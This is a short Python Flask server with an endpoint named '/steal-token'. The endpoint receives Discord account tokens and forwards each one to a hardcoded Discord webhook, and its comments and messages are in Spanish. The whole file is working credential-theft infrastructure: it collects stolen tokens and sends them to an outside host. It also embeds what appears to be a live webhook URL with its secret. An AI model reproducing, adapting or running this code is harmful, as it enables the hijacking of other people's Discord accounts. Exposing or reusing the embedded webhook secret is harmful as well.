from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route('/steal-token', methods=['POST'])
def steal_token():
    data = request.json
    discord_token = data.get('discord_token')

    if discord_token:
        # Aquí enviamos el token a tu webhook
        webhook_url = 'https://discord.com/api/webhooks/1401237408368033885/YjgzC6hjpWt1la3iAe03sZXzYPYJ1kKLftNKVA7jeWU9IZVKhpXlltMjzky6CZwXSQr0'
        payload = {'content': f'Nuevo token de Discord: {discord_token}'}
        requests.post(webhook_url, json=payload)

        return jsonify({'message': 'Token recibido con éxito'}), 200
    else:
        return jsonify({'message': 'Token no proporcionado'}), 400

if __name__ == '__main__':
    app.run()
